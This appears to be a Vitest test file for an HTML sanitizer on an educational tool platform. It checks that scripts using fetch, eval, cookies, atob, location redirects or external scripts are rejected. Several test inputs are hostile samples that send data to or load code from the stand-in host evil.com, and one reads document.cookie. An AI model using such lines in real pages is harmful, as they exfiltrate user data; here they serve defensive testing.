import { describe, it, expect } from "vitest";
import { sanitizeHtml } from "@/lib/html-sanitizer";

function wrapInEduTool(script = ""): string {
  return `<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8"/>
  <title>测试 — 教立方</title>
  <link rel="stylesheet" href="../edu-lib/edu-base.css"/>
</head>
<body>
<div class="edu-tool">
  <div class="edu-toolbar"><div class="edu-toolbar-title">测试</div></div>
  <div class="edu-content"><canvas id="c" width="400" height="300"></canvas></div>
</div>
<script>${script}</script>
</body>
</html>`;
}

describe("sanitizeHtml", () => {
  it("接受合法的 edu-tool HTML", () => {
    const html = wrapInEduTool('function update() {} update();');
    const result = sanitizeHtml(html, { preserveInlineEventHandlers: true });
    expect(result).toContain('class="edu-tool"');
    expect(result).toContain("</html>");
  });

  it("拒绝缺少 DOCTYPE 的输入", () => {
    expect(() => sanitizeHtml("<html><body>no doctype</body></html>")).toThrow("DOCTYPE");
  });

  it("拒绝缺少 edu-tool 结构的输入", () => {
    const html = '<!DOCTYPE html><html><body><p>hello</p></body></html>';
    expect(() => sanitizeHtml(html)).toThrow("edu-tool");
  });

  it("拒绝包含 fetch() 的脚本", () => {
    const html = wrapInEduTool('fetch("https://evil.com/steal");');
    expect(() => sanitizeHtml(html)).toThrow("fetch()");
  });

  it("拒绝包含 eval() 的脚本", () => {
    const html = wrapInEduTool('eval("alert(1)");');
    expect(() => sanitizeHtml(html)).toThrow("eval()");
  });

  it("拒绝包含 localStorage 的脚本", () => {
    const html = wrapInEduTool('localStorage.setItem("x","1");');
    expect(() => sanitizeHtml(html)).toThrow("localStorage");
  });

  it("拒绝包含 XMLHttpRequest 的脚本", () => {
    const html = wrapInEduTool('new XMLHttpRequest();');
    expect(() => sanitizeHtml(html)).toThrow("XMLHttpRequest");
  });

  it("拒绝包含 document.cookie 的脚本", () => {
    const html = wrapInEduTool('var x = document.cookie;');
    expect(() => sanitizeHtml(html)).toThrow("document.cookie");
  });

  it("拒绝包含 String.fromCharCode 的脚本", () => {
    const html = wrapInEduTool('String.fromCharCode(102,101,116,99,104);');
    expect(() => sanitizeHtml(html)).toThrow("String.fromCharCode");
  });

  it("拒绝包含动态属性访问的脚本", () => {
    const html = wrapInEduTool('window["fetch"]("https://evil.com");');
    expect(() => sanitizeHtml(html)).toThrow("动态属性访问");
  });

  it("拒绝包含 atob() 的脚本", () => {
    const html = wrapInEduTool('atob("aHR0cHM6Ly9ldmlsLmNvbQ==");');
    expect(() => sanitizeHtml(html)).toThrow("atob()");
  });

  it("拒绝包含 document.write 的脚本", () => {
    const html = wrapInEduTool('document.write("<script>");');
    expect(() => sanitizeHtml(html)).toThrow("document.write()");
  });

  it("拒绝包含 location 赋值的脚本", () => {
    const html = wrapInEduTool('location.href = "https://evil.com";');
    expect(() => sanitizeHtml(html)).toThrow("location");
  });

  it("拒绝包含外部脚本引用的输入", () => {
    const html = wrapInEduTool('').replace(
      "</body>",
      '<script src="https://evil.com/steal.js"></script></body>'
    );
    expect(() => sanitizeHtml(html)).toThrow("外部脚本");
  });

  it("自动补充缺失的 edu-base.css 链接", () => {
    const html = `<!DOCTYPE html>
<html lang="zh-CN">
<head><meta charset="UTF-8"/><title>T</title></head>
<body><div class="edu-tool"><div class="edu-content"></div></div>
<script></script></body></html>`;
    const result = sanitizeHtml(html);
    expect(result).toContain("edu-lib/edu-base.css");
  });
});
